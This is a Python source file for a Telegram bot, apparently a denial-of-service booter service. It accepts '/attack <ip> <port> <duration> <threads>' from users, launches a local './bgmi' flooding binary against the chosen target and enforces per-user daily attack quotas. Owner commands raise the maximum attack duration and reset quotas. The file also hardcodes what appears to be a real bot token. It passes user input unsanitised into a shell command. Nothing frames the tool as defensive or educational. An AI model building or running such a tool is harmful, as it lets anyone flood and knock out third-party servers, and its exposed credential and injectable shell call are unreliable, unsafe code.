import os
import asyncio
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '7094229080:AAEDql1mLp-JEEpw9n9vBzRDfVZ965mzPy8'  # Replace with your bot token
OWNER_USERNAME = "Riyahacksyt"  # Replace with your Telegram username (without @)

is_attack_running = False  # Track if an attack is running
max_duration = 300  # Max attack duration in seconds
daily_attack_limit = 30  # Max attacks per user per day
user_attacks = {}  # Store user attack counts {user_id: remaining_attacks}

# Start Command
async def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if user_id not in user_attacks:
        user_attacks[user_id] = daily_attack_limit

    keyboard = []
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration> <threads>*\n\n"
        f"⚔️ *You have {user_attacks[user_id]} attacks left today!* ⚔️\n\n"
        "*💥 Let the war begin!*"
    )
    
    await update.message.reply_text(text=message, parse_mode='Markdown', reply_markup=reply_markup)

# Attack Command (Only one attack at a time)
async def attack(update: Update, context: CallbackContext):
    global is_attack_running  
    user_id = update.effective_user.id

    if is_attack_running:
        await update.message.reply_text("⚠️ *Please wait! Another attack is already running.*", parse_mode='Markdown')
        return

    if user_id not in user_attacks:
        user_attacks[user_id] = daily_attack_limit

    if user_attacks[user_id] <= 0:
        await update.message.reply_text("❌ *You have used all your daily attacks! Wait for reset or ask the owner to reset.*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 4:
        await update.message.reply_text("⚠️ *Usage: /attack <ip> <port> <duration> <threads>*", parse_mode='Markdown')
        return

    ip, port, duration, threads = args
    duration = int(duration)
    threads = int(threads)

    if duration > max_duration:
        await update.message.reply_text(f"❌ *Attack duration exceeds the max limit ({max_duration} sec)!*", parse_mode='Markdown')
        return

    is_attack_running = True  # Mark attack as running
    user_attacks[user_id] -= 1  # Deduct 1 attack
    remaining_attacks = user_attacks[user_id]

    await update.message.reply_text(
        f"⚔️ *Attack Started!*\n"
        f"🎯 *Target*: {ip}:{port}\n"
        f"🕒 *Duration*: {duration} sec\n"
        f"🧵 *Threads*: {threads}\n"
        f"🔥 *Let the battlefield ignite! 💥*\n\n"
        f"💥 *You have {remaining_attacks} attacks left today!*",
        parse_mode='Markdown'
    )

    asyncio.create_task(run_attack(update.effective_chat.id, ip, port, duration, threads, context))

# Run Attack (Non-blocking)
async def run_attack(chat_id, ip, port, duration, threads, context):
    global is_attack_running
    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration} {threads}",  
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        await process.communicate()
    finally:
        is_attack_running = False  # Mark attack as finished
        await context.bot.send_message(chat_id=chat_id, text="✅ *Attack Completed!*", parse_mode='Markdown')

# Set Max Attack Duration
async def set_max_duration(update: Update, context: CallbackContext):
    global max_duration

    if update.effective_user.username != OWNER_USERNAME:
        await update.message.reply_text("❌ *Only the owner can set max duration!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 1 or not args[0].isdigit():
        await update.message.reply_text("⚠️ *Usage: /setmaxduration <seconds>*", parse_mode='Markdown')
        return

    max_duration = min(int(args[0]), 3600)  
    await update.message.reply_text(f"✅ *Max attack duration set to {max_duration} seconds!*")

# Reset User Attacks (Owner Only)
async def reset_attacks(update: Update, context: CallbackContext):
    if update.effective_user.username != OWNER_USERNAME:
        await update.message.reply_text("❌ *Only the owner can reset attacks!*", parse_mode='Markdown')
        return

    for user_id in user_attacks:
        user_attacks[user_id] = daily_attack_limit

    await update.message.reply_text(f"✅ *All users' attack limits have been reset to {daily_attack_limit}!*")

# Main Bot Setup
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("setmaxduration", set_max_duration))
    application.add_handler(CommandHandler("resetattacks", reset_attacks))

    application.run_polling()

if __name__ == '__main__':
    main()
